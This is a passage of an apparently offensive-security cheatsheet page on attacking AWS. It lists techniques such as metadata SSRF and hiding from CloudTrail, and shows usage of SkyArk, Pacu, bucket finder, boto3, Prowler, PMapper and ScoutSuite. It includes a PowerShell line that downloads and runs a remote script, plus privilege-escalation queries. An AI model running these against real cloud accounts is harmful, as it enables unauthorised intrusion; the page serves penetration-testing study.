      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_41_6_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_41_6">
          <span class="md-nav__icon md-icon"></span>
          Extension Flash
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Upload%20Insecure%20Files/Extension%20Flash/" class="md-nav__link">
        Index
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_41_7" >
      
      
      
        <label class="md-nav__link" for="__nav_41_7" id="__nav_41_7_label" tabindex="0">
          Picture Image Magik
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_41_7_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_41_7">
          <span class="md-nav__icon md-icon"></span>
          Picture Image Magik
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Upload%20Insecure%20Files/Picture%20Image%20Magik/" class="md-nav__link">
        Image Tragik 1 & 2
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_41_8" >
      
      
      
        <label class="md-nav__link" for="__nav_41_8" id="__nav_41_8_label" tabindex="0">
          Zip Slip
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_41_8_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_41_8">
          <span class="md-nav__icon md-icon"></span>
          Zip Slip
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Upload%20Insecure%20Files/Zip%20Slip/" class="md-nav__link">
        Zip Slip
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_42" >
      
      
      
        <label class="md-nav__link" for="__nav_42" id="__nav_42_label" tabindex="0">
          Web Cache Deception
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_42_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_42">
          <span class="md-nav__icon md-icon"></span>
          Web Cache Deception
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Web%20Cache%20Deception/" class="md-nav__link">
        Web Cache Deception
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_43" >
      
      
      
        <label class="md-nav__link" for="__nav_43" id="__nav_43_label" tabindex="0">
          Web Sockets
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_43_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_43">
          <span class="md-nav__icon md-icon"></span>
          Web Sockets
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Web%20Sockets/" class="md-nav__link">
        Web Sockets
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_44" >
      
      
      
        <label class="md-nav__link" for="__nav_44" id="__nav_44_label" tabindex="0">
          XPATH Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_44_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_44">
          <span class="md-nav__icon md-icon"></span>
          XPATH Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../XPATH%20Injection/" class="md-nav__link">
        XPATH Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_45" >
      
      
      
        <label class="md-nav__link" for="__nav_45" id="__nav_45_label" tabindex="0">
          XSLT Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_45_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_45">
          <span class="md-nav__icon md-icon"></span>
          XSLT Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../XSLT%20Injection/" class="md-nav__link">
        XSLT Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_46" >
      
      
      
        <label class="md-nav__link" for="__nav_46" id="__nav_46_label" tabindex="0">
          XSS Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_46_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_46">
          <span class="md-nav__icon md-icon"></span>
          XSS Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../XSS%20Injection/" class="md-nav__link">
        Cross Site Scripting
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../XSS%20Injection/XSS%20in%20Angular/" class="md-nav__link">
        XSS in Angular and AngularJS
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../XSS%20Injection/XSS%20with%20Relative%20Path%20Overwrite/" class="md-nav__link">
        XSS with Relative Path Overwrite - IE 8/9 and lower
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_47" >
      
      
      
        <label class="md-nav__link" for="__nav_47" id="__nav_47_label" tabindex="0">
          XXE Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_47_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_47">
          <span class="md-nav__icon md-icon"></span>
          XXE Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../XXE%20Injection/" class="md-nav__link">
        XML External Entity
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_48" >
      
      
      
        <label class="md-nav__link" for="__nav_48" id="__nav_48_label" tabindex="0">
           LEARNING AND SOCIALS
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_48_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_48">
          <span class="md-nav__icon md-icon"></span>
           LEARNING AND SOCIALS
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../_LEARNING_AND_SOCIALS/BOOKS/" class="md-nav__link">
        Books
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../_LEARNING_AND_SOCIALS/TWITTER/" class="md-nav__link">
        Twitter
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../_LEARNING_AND_SOCIALS/YOUTUBE/" class="md-nav__link">
        Youtube
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_49" >
      
      
      
        <label class="md-nav__link" for="__nav_49" id="__nav_49_label" tabindex="0">
           template vuln
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_49_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_49">
          <span class="md-nav__icon md-icon"></span>
           template vuln
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../_template_vuln/" class="md-nav__link">
        Vulnerability Title
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  

  
  


<h1 id="cloud-aws">Cloud - AWS</h1>
<blockquote>
<p>Amazon Web Services offers reliable, scalable, and inexpensive cloud computing services.</p>
</blockquote>
<h2 id="summary">Summary</h2>
<ul>
<li><a href="#aws">AWS</a></li>
<li><a href="#summary">Summary</a></li>
<li><a href="#training">Training</a></li>
<li><a href="#tools">Tools</a></li>
<li><a href="#aws-patterns">AWS Patterns</a></li>
<li><a href="#aws---metadata-ssrf">AWS - Metadata SSRF</a><ul>
<li><a href="#method-for-elastic-cloud-compute-ec2">Method for Elastic Cloud Compute (EC2)</a></li>
<li><a href="#method-for-container-service-fargate">Method for Container Service (Fargate)</a></li>
<li><a href="#aws-api-calls-that-return-credentials">AWS API calls that return credentials</a></li>
</ul>
</li>
<li><a href="#aws---shadow-admin">AWS - Shadow Admin</a><ul>
<li><a href="#admin-equivalent-permission">Admin equivalent permission</a></li>
</ul>
</li>
<li><a href="#aws---gaining-aws-console-access-via-api-keys">AWS - Gaining AWS Console Access via API Keys</a></li>
<li><a href="#aws---enumerate-iam-permissions">AWS - Enumerate IAM permissions</a></li>
<li><a href="#aws---mount-ebs-volume-to-ec2-linux">AWS - Mount EBS volume to EC2 Linux</a></li>
<li><a href="#aws---copy-ec2-using-ami-image">AWS - Copy EC2 using AMI Image</a></li>
<li><a href="#aws---instance-connect---push-an-ssh-key-to-ec2-instance">AWS - Instance Connect - Push an SSH key to EC2 instance</a></li>
<li><a href="#aws---lambda---extract-functions-code">AWS - Lambda - Extract function's code</a></li>
<li><a href="#aws---ssm---command-execution">AWS - SSM - Command execution</a></li>
<li><a href="#aws---golden-saml-attack">AWS - Golden SAML Attack</a></li>
<li><a href="#aws---shadow-copy-attack">AWS - Shadow Copy attack</a></li>
<li><a href="#disable-cloudtrail">Disable CloudTrail</a></li>
<li><a href="#cover-tracks-by-obfuscating-cloudtrail-logs-and-guard-duty">Cover tracks by obfuscating Cloudtrail logs and Guard Duty</a></li>
<li><a href="#dynamodb">DynamoDB</a></li>
<li><a href="#security-checks">Security checks</a></li>
<li><a href="#awsome-pentesting-cheatsheet">AWSome Pentesting Cheatsheet</a></li>
<li><a href="#references">References</a></li>
</ul>
<h2 id="training">Training</h2>
<ul>
<li>AWSGoat : A Damn Vulnerable AWS Infrastructure - https://github.com/ine-labs/AWSGoat</li>
<li>Damn Vulnerable Cloud Application - https://medium.com/poka-techblog/privilege-escalation-in-the-cloud-from-ssrf-to-global-account-administrator-fd943cf5a2f6</li>
<li>SadCloud - https://github.com/nccgroup/sadcloud</li>
<li>Flaws - http://flaws.cloud</li>
<li>Cloudgoat - https://github.com/RhinoSecurityLabs/cloudgoat</li>
</ul>
<h2 id="tools">Tools</h2>
<ul>
<li>
<p><a href="https://github.com/cyberark/SkyArk">SkyArk</a> - Discover the most privileged users in the scanned AWS environment, including the AWS Shadow Admins</p>
<ul>
<li>Requires read-Only permissions over IAM service
<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="p">$</span> <span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">cyberark</span><span class="p">/</span><span class="n">SkyArk</span>
<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="p">$</span> <span class="n">powershell</span> <span class="n">-ExecutionPolicy</span> <span class="n">Bypass</span> <span class="n">-NoProfile</span>
<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="nb">PS </span><span class="n">C</span><span class="p">&gt;</span> <span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">SkyArk</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-force</span>
<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="nb">PS </span><span class="n">C</span><span class="p">&gt;</span> <span class="nb">Start-AWStealth</span>
<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>
<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="n">or</span> <span class="k">in</span> <span class="n">the</span> <span class="n">Cloud</span> <span class="n">Console</span>
<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>
<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="nb">PS </span><span class="n">C</span><span class="p">&gt;</span> <span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;https://raw.githubusercontent.com/cyberark/SkyArk/master/AWStealth/AWStealth.ps1&#39;</span><span class="p">)</span>  
<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="nb">PS </span><span class="n">C</span><span class="p">&gt;</span> <span class="n">Scan-AWShadowAdmins</span>  
</code></pre></div></li>
</ul>
</li>
<li>
<p><a href="https://github.com/RhinoSecurityLabs/pacu">Pacu</a> - Exploit configuration flaws within an AWS environment using an extensible collection of modules with a diverse feature-set</p>
<ul>
<li>Requires AWS Keys
<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="p">$</span> <span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">RhinoSecurityLabs</span><span class="p">/</span><span class="n">pacu</span>
<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="p">$</span> <span class="n">bash</span> <span class="n">install</span><span class="p">.</span><span class="n">sh</span>
<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="p">$</span> <span class="n">python3</span> <span class="n">pacu</span><span class="p">.</span><span class="n">py</span>
<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="n">set_keys</span><span class="p">/</span><span class="n">swap_keys</span>
<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="nb">ls</span>
<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="n">run</span> <span class="p">&lt;</span><span class="n">module_name</span><span class="p">&gt;</span> <span class="p">[-</span><span class="n">-keyword-arguments</span><span class="p">]</span>
<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="n">run</span> <span class="p">&lt;</span><span class="n">module_name</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-regions</span> <span class="n">eu-west</span><span class="p">-</span><span class="n">1</span><span class="p">,</span><span class="n">us-west</span><span class="p">-</span><span class="n">1</span>
<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>
<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="c"># https://github.com/RhinoSecurityLabs/pacu/wiki/Module-Details</span>
</code></pre></div></li>
</ul>
</li>
<li>
<p><a href="https://digi.ninja/projects/bucket_finder.php">Bucket Finder</a> - Search for public buckets, list and download all files if directory indexing is enabled
    <div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nb">wget </span><span class="n">https</span><span class="p">://</span><span class="n">digi</span><span class="p">.</span><span class="n">ninja</span><span class="p">/</span><span class="n">files</span><span class="p">/</span><span class="n">bucket_finder_1</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">tar</span><span class="p">.</span><span class="n">bz2</span> <span class="n">-O</span> <span class="n">bucket_finder_1</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">tar</span><span class="p">.</span><span class="n">bz2</span>
<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="p">./</span><span class="n">bucket_finder</span><span class="p">.</span><span class="n">rb</span> <span class="n">my_words</span>
<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="p">./</span><span class="n">bucket_finder</span><span class="p">.</span><span class="n">rb</span> <span class="p">-</span><span class="n">-region</span> <span class="n">ie</span> <span class="n">my_words</span>
<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>    <span class="n">US</span> <span class="n">Standard</span>         <span class="p">=</span> <span class="n">http</span><span class="p">://</span><span class="n">s3</span><span class="p">.</span><span class="n">amazonaws</span><span class="p">.</span><span class="n">com</span>
<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>    <span class="n">Ireland</span>             <span class="p">=</span> <span class="n">http</span><span class="p">://</span><span class="n">s3-eu-west</span><span class="p">-</span><span class="n">1</span><span class="p">.</span><span class="n">amazonaws</span><span class="p">.</span><span class="n">com</span>
<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>    <span class="n">Northern</span> <span class="n">California</span> <span class="p">=</span> <span class="n">http</span><span class="p">://</span><span class="n">s3-us-west</span><span class="p">-</span><span class="n">1</span><span class="p">.</span><span class="n">amazonaws</span><span class="p">.</span><span class="n">com</span>
<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>    <span class="n">Singapore</span>           <span class="p">=</span> <span class="n">http</span><span class="p">://</span><span class="n">s3-ap-southeast</span><span class="p">-</span><span class="n">1</span><span class="p">.</span><span class="n">amazonaws</span><span class="p">.</span><span class="n">com</span>
<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>    <span class="n">Tokyo</span>               <span class="p">=</span> <span class="n">http</span><span class="p">://</span><span class="n">s3-ap-northeast</span><span class="p">-</span><span class="n">1</span><span class="p">.</span><span class="n">amazonaws</span><span class="p">.</span><span class="n">com</span>
<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>
<a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="p">./</span><span class="n">bucket_finder</span><span class="p">.</span><span class="n">rb</span> <span class="p">-</span><span class="n">-download</span> <span class="p">-</span><span class="n">-region</span> <span class="n">ie</span> <span class="n">my_words</span>
<a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="p">./</span><span class="n">bucket_finder</span><span class="p">.</span><span class="n">rb</span> <span class="p">-</span><span class="n">-log</span><span class="o">-file</span> <span class="n">bucket</span><span class="p">.</span><span class="n">out</span> <span class="n">my_words</span>
</code></pre></div></p>
</li>
<li>
<p><a href="https://boto3.amazonaws.com/v1/documentation/api/latest/index.html">Boto3</a> - Amazon Web Services (AWS) SDK for Python
    <div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="kn">import</span> <span class="nn">boto3</span>
<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="c1"># Create an S3 client</span>
<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="n">s3</span> <span class="o">=</span> <span class="n">boto3</span><span class="o">.</span><span class="n">client</span><span class="p">(</span><span class="s1">&#39;s3&#39;</span><span class="p">,</span><span class="n">aws_access_key_id</span><span class="o">=</span><span class="s1">&#39;AKIAJQDP3RKREDACTED&#39;</span><span class="p">,</span><span class="n">aws_secret_access_key</span><span class="o">=</span><span class="s1">&#39;igH8yFmmpMbnkcUaCqXJIRIozKVaREDACTED&#39;</span><span class="p">,</span><span class="n">region_name</span><span class="o">=</span><span class="s1">&#39;us-west-1&#39;</span><span class="p">)</span>
<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>
<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="k">try</span><span class="p">:</span>
<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>    <span class="n">result</span> <span class="o">=</span> <span class="n">s3</span><span class="o">.</span><span class="n">list_buckets</span><span class="p">()</span>
<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>    <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
<a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>    <span class="nb">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
</code></pre></div></p>
</li>
<li>
<p><a href="https://github.com/toniblyx/prowler">Prowler</a> - AWS security best practices assessments, audits, incident response, continuous monitoring, hardening and forensics readiness</p>
<blockquote>
<p>It follows guidelines of the CIS Amazon Web Services Foundations Benchmark and DOZENS of additional checks including GDPR and HIPAA (+100).  <br />
* Require: arn:aws:iam::aws:policy/SecurityAudit</p>
</blockquote>
<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="p">$</span> <span class="n">pip</span> <span class="n">install</span> <span class="n">awscli</span> <span class="n">ansi2html</span> <span class="n">detect-secrets</span>
<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="p">$</span> <span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">toniblyx</span><span class="p">/</span><span class="n">prowler</span>
<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="p">$</span> <span class="n">sudo</span> <span class="n">apt</span> <span class="n">install</span> <span class="n">jq</span>
<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="p">$</span> <span class="p">./</span><span class="n">prowler</span> <span class="n">-E</span> <span class="n">check42</span><span class="p">,</span><span class="n">check43</span>
<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="p">$</span> <span class="p">./</span><span class="n">prowler</span> <span class="n">-p</span> <span class="n">custom-profile</span> <span class="n">-r</span> <span class="n">us-east</span><span class="p">-</span><span class="n">1</span> <span class="n">-c</span> <span class="n">check11</span>
<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="p">$</span> <span class="p">./</span><span class="n">prowler</span> <span class="n">-A</span> <span class="n">123456789012</span> <span class="n">-R</span> <span class="n">ProwlerRole</span>  <span class="c"># sts assume-role</span>
</code></pre></div>
</li>
<li>
<p><a href="https://github.com/nccgroup/PMapper">Principal Mapper</a> - A tool for quickly evaluating IAM permissions in AWS
    <div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">nccgroup</span><span class="p">/</span><span class="n">PMapper</span>
<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="n">pip</span> <span class="n">install</span> <span class="n">principalmapper</span>
<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="n">pmapper</span> <span class="n">graph</span> <span class="p">-</span><span class="n">-create</span>
<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="n">pmapper</span> <span class="n">visualize</span> <span class="p">-</span><span class="n">-filetype</span> <span class="n">png</span>
<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="n">pmapper</span> <span class="n">analysis</span> <span class="p">-</span><span class="n">-output-type</span> <span class="n">text</span>
<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>
<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="c"># Determine if PowerUser can escalate privileges</span>
<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="n">pmapper</span> <span class="n">query</span> <span class="s2">&quot;preset privesc user/PowerUser&quot;</span>
<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a><span class="n">pmapper</span> <span class="n">argquery</span> <span class="p">-</span><span class="n">-principal</span> <span class="n">user</span><span class="p">/</span><span class="n">PowerUser</span> <span class="p">-</span><span class="n">-preset</span> <span class="n">privesc</span>
<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>
<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a><span class="c"># Find all principals that can escalate privileges</span>
<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="n">pmapper</span> <span class="n">query</span> <span class="s2">&quot;preset privesc *&quot;</span>
<a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a><span class="n">pmapper</span> <span class="n">argquery</span> <span class="p">-</span><span class="n">-principal</span> <span class="s1">&#39;*&#39;</span> <span class="p">-</span><span class="n">-preset</span> <span class="n">privesc</span>
<a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a>
<a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a><span class="c"># Find all principals that PowerUser can access</span>
<a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a><span class="n">pmapper</span> <span class="n">query</span> <span class="s2">&quot;preset connected user/PowerUser *&quot;</span>
<a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a><span class="n">pmapper</span> <span class="n">argquery</span> <span class="p">-</span><span class="n">-principal</span> <span class="n">user</span><span class="p">/</span><span class="n">PowerUser</span> <span class="p">-</span><span class="n">-resource</span> <span class="s1">&#39;*&#39;</span> <span class="p">-</span><span class="n">-preset</span> <span class="n">connected</span>
<a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a>
<a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a><span class="c"># Find all principals that can access PowerUser</span>
<a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a><span class="n">pmapper</span> <span class="n">query</span> <span class="s2">&quot;preset connected * user/PowerUser&quot;</span>
<a id="__codelineno-5-21" name="__codelineno-5-21" href="#__codelineno-5-21"></a><span class="n">pmapper</span> <span class="n">argquery</span> <span class="p">-</span><span class="n">-principal</span> <span class="s1">&#39;*&#39;</span> <span class="p">-</span><span class="n">-resource</span> <span class="n">user</span><span class="p">/</span><span class="n">PowerUser</span> <span class="p">-</span><span class="n">-preset</span> <span class="n">connected</span>
</code></pre></div></p>
</li>
<li>
<p><a href="https://github.com/nccgroup/ScoutSuite/wiki">ScoutSuite</a> - Multi-Cloud Security Auditing Tool
    <div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="p">$</span> <span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">nccgroup</span><span class="p">/</span><span class="n">ScoutSuite</span>
<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="p">$</span> <span class="n">python</span> <span class="n">scout</span><span class="p">.</span><span class="n">py</span> <span class="n">PROVIDER</span> <span class="p">-</span><span class="n">-help</span>
<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="c"># The --session-token is optional and only used for temporary credentials (i.e. role assumption).</span>
<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="p">$</span> <span class="n">python</span> <span class="n">scout</span><span class="p">.</span><span class="n">py</span> <span class="n">aws</span> <span class="p">-</span><span class="n">-access-keys</span> <span class="p">-</span><span class="n">-access-key-id</span> <span class="p">&lt;</span><span class="n">AKIAIOSFODNN7EXAMPLE</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-secret-access-key</span> <span class="p">&lt;</span><span class="n">wJalrXUtnFEMI</span><span class="p">/</span><span class="n">K7MDENG</span><span class="p">/</span><span class="n">bPxRfiCYEXAMPLEKEY</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-session-token</span> <span class="p">&lt;</span><span class="n">token</span><span class="p">&gt;</span>
